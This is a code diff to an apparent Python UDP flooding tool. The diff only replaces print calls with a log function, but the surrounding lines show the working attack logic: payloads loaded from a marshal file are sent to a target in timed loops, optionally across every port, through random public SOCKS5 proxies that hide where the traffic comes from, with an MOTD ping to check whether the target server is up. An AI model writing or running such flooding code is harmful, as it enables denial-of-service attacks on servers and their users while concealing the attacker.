@@ -5,14 +5,14 @@ import sys
 import time
 import os
 from motd import sendPacket as sendMotdPacket
-from api import getLocalHostIP, getTime
+from api import getLocalHostIP, getTime, log
 
 try:
     import wget
     import socks
     import requests
 except:
-    print("Import module error! Please run \"pip install -r requirements.txt\"")
+    log("Import module error! Please run \"pip install -r requirements.txt\"")
     os._exit(1)
 
 localHostIP = getLocalHostIP()
@@ -41,7 +41,7 @@ def getOptions():
             proxyCountry = sys.argv[8]
         except:
             proxyCountry = input("ProxyCountry(like cn, ru, us or enter to use all): ")
-        print(f"[{getTime()}] Proxy mode is under development and deprecated!")
+        log(f"Proxy mode is under development and deprecated!")
         proxyUsed = True
     else:
         proxyUsed = False
@@ -59,7 +59,7 @@ target, port, file, loops, interval, proxyUsed, isDisplayMotd, proxyCountry = ge
 
 def getProxy() -> list:
     try:
-        print(f"[{getTime()}] Trying to get proxy data from api...")
+        log(f"Trying to get proxy data from api...")
         proxyInfo = requests.get(
             f"https://www.proxyscan.io/api/proxy?last_check=3600&uptime=&ping=&limit=1&type=socks5&format=json&country={proxyCountry}").json()
         proxyIP = proxyInfo[0]['Ip']
@@ -67,17 +67,17 @@ def getProxy() -> list:
         return proxyIP, int(proxyPort)
     except:
         if not os.path.exists(r"socks5.txt"):
-            print(f"[{getTime()}] Request api failed. Downloading proxy list...")
+            log(f"Request api failed. Downloading proxy list...")
             wget.download(
                 "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt")
-            print(f"")
-            print(f"[{getTime()}] Proxy list downloaded!")
+            print()
+            log(f"Proxy list downloaded!")
         with open("socks5.txt", "r") as file:
             socksList = file.readlines()
             randomIndex = random.randint(0, len(socksList) - 1)
             proxy = socksList[randomIndex]
             proxyIP, proxyPort = proxy.rsplit(':', 1)
-            #print(proxyIP, ":", proxyPort)
+            #log(proxyIP, ":", proxyPort)
             return proxyIP, int(proxyPort)
 
 
@@ -89,7 +89,7 @@ def createSocket():
         proxyIP, proxyPort = getProxy()
         socketSend.set_proxy(socks.SOCKS5, proxyIP, proxyPort)
         if proxyUsed:
-            print(f"[{getTime()}] Used proxy: {proxyIP}:{proxyPort}")
+            log(f"Used proxy: {proxyIP}:{proxyPort}")
     else:
         socketSend = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         socketSend.bind((str(localHostIP), localPort))
@@ -106,15 +106,15 @@ def sendPacket(target, port, file, loops, interval):
         try:
             payloads = marshal.load(open(file, "rb"))
         except:
-            print(f"[{getTime()}] Payload file not found!")
+            log(f"Payload file not found!")
             sys.exit()
         try:
             if isDisplayMotd:
                 sendMotdPacket(target, port)
         except:
             if isDisplayMotd:
-                print(f"[{getTime()}] Target server offline.")
-        #print(f"[{getTime()}] Sending packet...")
+                log(f"Target server offline.")
+        #log(f"Sending packet...")
         try:
             if port == "*":
                 for port in range(65535):
@@ -123,10 +123,10 @@ def sendPacket(target, port, file, loops, interval):
             else:
                 for line in payloads:
                     socketSend.sendto(line, (target, int(port)))
-            print(f"[{getTime()}] Loop ", str(i),
+            log(f"Loop ", str(i),
                   " done, used local port: ", str(localPort), "\n")
         except:
-            print(f"[{getTime()}] Loop ", str(i), " error! Skip...", "\n")
+            log(f"Loop ", str(i), " error! Skip...", "\n")
             pass
         if i+1 < loops:
             time.sleep(interval)
